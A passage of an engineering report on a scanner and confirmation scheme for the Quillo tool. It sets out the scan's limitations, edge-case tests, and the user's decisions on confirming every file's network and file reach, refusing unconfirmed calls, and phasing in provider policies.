| Wrote, from the guide, that two routes alike are not reported | "Files of a program" says so | `quillo check` on 0.8.9 warns `this route is never reached`. The guide's line is behind the checker | 1 probe, and a line of the guide to bring up to date |
| Left a bare `head` in a probe's command | a slip | it waited for input until the command timed out, and the probe's server stayed up. Both were stopped by their own PIDs | 2 minutes |

## Limitations

- **No scan finds what a file hides on purpose:** an address built from bytes, a crate that does the work, a script that loads another. For Quillo code and pages, that is why the list must be held. For Rust, it is why confirming means one exact file, read by someone.
- **A plugin's crates were not scanned.** What `ureq` or `image` do is not in the plugin's file, and each brings crates of its own. A crate's build script runs when the plugin is built.
- **The prototype is patterns, not a parser.** Its `.qwe` numbers are lower bounds for what a built scan would list (B.3), and its Rust numbers carry the noise of B.4.
- **Nothing ran in a browser.** The script and image of A.1 were read in the HTML the server sent, not seen requested. The CSP of D.4 was not built or tried, and pages with inline scripts of their own are known to need care (the guide's notes on `content-security-policy`).
- **Not probed:** `quillo app`, phone apps, `--split` services, Linux and Windows.
- **A confirmed host is not a safe host.** The list says where a file goes, not what it sends there.

## Edge cases checked that behave well

| Case | Result |
|---|---|
| A taken file's post at start, under `[http] hosts` | refused: the other server saw nothing |
| A taken file under a policy without `fs` and `http` | `quillo check` names each call with the file and line |
| A runtime error in a taken file's route | logged with its file and line (`kit/badge.qwe:16`) |
| A plugin taken under an effects policy and never called | passes, as the guide says: the refusal is at the call |
| A taken file declaring a route the main file also has | `quillo check` warns that the main file's route is never reached, naming the taken file's line (the taken one still answers: Q-1301) |
| `quillo install` over a file changed by hand | kept, and said: `differs from the catalog's: changed by hand? --force replaces it` |
| Crates from git or a path, in the catalog | none in 632 |
| Server code in the kit | none in 878 files |
| The kit's `fetch` calls | 3 files: the page's own address, or a `src` the program gives |
| Building a small plugin with no crates of its own | 1.4 s with the cache warm |

## Questions for the user (all decided: 1 to 5 on 2026-11-21, 6 on 2026-11-22; 5 revised on 2026-11-23)

Built since, on branch `feedback82-85` for 0.8.11 (`CHANGELOG.md`, "Unreleased (0.8.11)"). The questions are kept as they were asked, each with its decision.

### 1. Decided: the scan covers every file of the program

**The user, 2026-11-21: "should be every file".** Quillo cannot tell a copied file from a written one: components are copied with `curl` or by hand into any folder, and nothing records where a file came from.

| Impact | |
|---|---|
| **Functionality** | One list for the whole program, grouped by file. The main file and the developer's own are in it too |
| **User** | The developer confirms their own addresses as well: for `stays`, 4 hosts and 2 folders, once. For the forum app, nothing. On a terminal a new host costs one key, and `quillo confirm lib/` takes a folder at once |
| **Requests** | No change |
| **Security** | No file is left out because it looked like the developer's own. That is the file an attacker would want to be |

What "every file" takes in, as I read it (to settle when this is planned):

- every `.qwe` file the program takes by `use` or `import`, the main file included;
- every Rust file it takes (`.qwer`, `.rs`), each by its hash;
- the program's own `.js` and `.mjs` files that a `client` line names. They are JavaScript, so they are read for written addresses only, and held by the page's CSP;
- a mounted program's and a service's files, each program with a `quillo.confirmed` beside its own main file, as each has its own `.env`.

The `taken = [...]` list of folders, the other choice, is dropped.

### 2. Decided: Quillo holds the program to what was confirmed

**The user, 2026-11-21: "hold it".** A list that nothing holds is wrong at the first address that is worked out, and most real reach is worked out.** Measured: 53 of 196 network plugins write no address, 13 kit files put theirs together in the browser, and `stays` hands 3 of its 4 hosts through a helper.

| Impact | |
|---|---|
| **Functionality** | `http.*` and the file builtins refuse what the calling file was not confirmed for. Pages get a CSP from the list, report-only until the developer turns it on. A plugin loads only at its confirmed hash |
| **User** | A refusal names the file, the line and the command: `kit/badge.qwe:4: http: 127.0.0.1:47831 is not confirmed for this file (quillo confirm)` |
| **Requests** | One comparison at each `http.*` call, where the policy's is made now, and one header on each page. Measured before it lands, old binary against new |
| **Security** | A taken file reaches what was read and agreed, and no more. For a plugin: the file that was read is the file that runs, and no more than that is promised |

What reporting only had, and this gives up: it could never break a page that works. So the order of building is: server calls first, then plugin hashes, then the pages' CSP, which starts report-only and is enforced when the developer turns it on (D.4). A scan that only reports (`quillo check --reach`) is dropped as the end state. It may still be the first slice.

### 3. Decided: with no one to ask, what is not confirmed is refused

**The user, 2026-11-21: "refuse".** That one thing is refused, and said. The start stops only for a plugin. It happens on every deploy where a file changed after the last `quillo confirm`: CI, systemd, FastCGI, a container.

| Impact | |
|---|---|
| **Functionality** | `quillo check` exits 1, so CI stops the deploy first. If it starts anyway: an unconfirmed `http.*` call or path is an error value at the call, logged once with file and line. An unconfirmed script is left out. A plugin whose hash is not confirmed is not loaded, and the program stops, as when `[plugins] allow` refuses one today |
| **User** | The site stays up and one feature fails loudly, with the command to run in the log |
| **Requests** | The requests that need the refused call fail. The rest are served |
| **Security** | Nothing unconfirmed is reached or run |

What today's way had, and this gives up: no deploy fails because someone forgot a step. `quillo check` in CI is what catches it before the deploy. Warning once and running everything is dropped.

Under a provider's policy the start itself stops: question 5.

### 4. Decided: the catalog is included

**The user, 2026-11-21: "includes catalog".** None of the 632 plugins says what it does, and under a policy each needs a hand edit that costs it its updates (Q-1306).**

| Impact | |
|---|---|
| **Functionality** | Each plugin file gets its `//! effects:` line. Each catalog entry gets what the scan found: hosts, variables, whether it reads or writes files or starts programs. `quillo install` prints them, and a yes writes the block and the hash. The components page says which 3 components load a script and which 4 name other hosts |
| **User** | A developer sees what a plugin reaches before taking it, and edits nothing |
| **Requests** | No change |
| **Security** | The line is checked against the code when it is published (Q-1305). It stays the author's word for what the crates do |

What it costs: work on 632 files. Each gets a new line, so a new hash and a version step, and the catalog's tests run again. The scan proposes the line, and a person reads the plugins that reach the network (196) or start programs (3) before the rest.

How I read "includes catalog" (to correct if wrong):

- the catalog carries each plugin's `//! effects:` line and its list, as asked in this question;
- a catalog plugin is scanned and confirmed like any other file, with no pass for coming from the catalog. That follows from question 1 as well;
- the kit's part of the question (the components page naming the 3 components that load a script and the 4 that name other hosts) is taken as included with it. The answer named the catalog only, so this part is my reading.

### 5. Decided: a provider's policy requires a complete `quillo.confirmed`

**The user, 2026-11-21: "policy must require complete".** Asked as: may a provider's policy require a complete `quillo.confirmed` before anything starts? It happens on every host that runs others' programs under a policy (FEEDBACK82).

**Revised by the user, 2026-11-23: only a provider's layers ask for it.** Those are the host's file, what it includes, `policy.d` and `QUILLO_POLICY_PATH`. A file given with `--policy` is the developer's, as `quillo.policy` is, and does not ask. This replaces "any layer may ask for it" and my first reading, both below.

| Impact | |
|---|---|
| **Functionality** | Under a provider's policy, a program starts only when its `quillo.confirmed` is there and nothing the scan lists is outside it: every written address, path and script, and each Rust file's hash. Otherwise the start stops, naming what is missing and the policy file that asks for it. `quillo check --policy` says the same before a deploy |
| **User** | A provider can say of every account that what runs was listed and confirmed. A developer deploys `quillo.confirmed` with the program. A forgotten `quillo confirm` is a failed start, not one failing feature |
| **Requests** | A program that is not complete serves nothing until it is. For one that is complete, no change |
| **Security** | Stricter than question 3 wherever a policy is in force: nothing starts half-confirmed. The yes is the developer's own, so it proves that the list was agreed, not that it is harmless. What the provider gains is each program's reach written in one file it can read, with nothing outside that file reached, inside the hosts and paths its own policy allows |

What "complete" can and cannot mean:

- **It covers what the scan lists as the program starts.** An address worked out while the program runs is not in that list. It is refused when it is used, as question 3 decided.
- **It only narrows, as every policy setting does.** Any layer may ask for it, and no later layer can take it back.

How I read "policy must require complete" (the first reading was corrected by the revision of 2026-11-23, above):

- "A provider's policy" is the host's file and any `--policy` file. The program's own `quillo.policy` may ask for it too. **Corrected:** neither a `--policy` file nor `quillo.policy` asks.
- "Must" is read as: this is how a provider's policy works. It is not a key (`[confirm] require = true`) that each provider has to remember to write. Where no policy is in force, question 3's softer rule stays: the one thing is refused and the program runs.

This adds a twelfth thing to what a policy says. FEEDBACK82's question 1 (`[run]`, `[fs] paths`, `[env] set`) was decided on 2026-11-22, as that report's Part D has them.

### 6. Decided: the first release only warns under a provider's policy, and the next one stops

**The user, 2026-11-22, on the decisions page of the batch FEEDBACK82 to 85: warn for one release, then stop.** Asked as: should the first release that has this only warn under a policy, before it stops programs? Otherwise the upgrade itself stops every program on a host with a policy. It happens the day a host installs the release: no program there has a `quillo.confirmed` yet, since the file does not exist before that release.

As built: 0.8.11 warns at start and in `quillo check`, naming 0.8.12, from which such a program does not start.

| Impact | |
|---|---|
| **Functionality** | In the first release, a start under a provider's policy without a complete `quillo.confirmed` runs, and warns at each start, naming the release from which it will stop. From the next release it stops |
| **User** | Developers on a host have one release in which to run `quillo confirm` and deploy the file. A provider sees in its logs which accounts have not |
| **Requests** | No site goes down because its host upgraded Quillo |
| **Security** | For that one release the requirement is a warning, which is no less than today |

What stopping at once has: the rule holds from the first day.

What was recommended, and taken: warn for one release, then stop. The recommendation also said a provider that wants the stop at once could say so in its policy. The guide for 0.8.11 names no such setting.
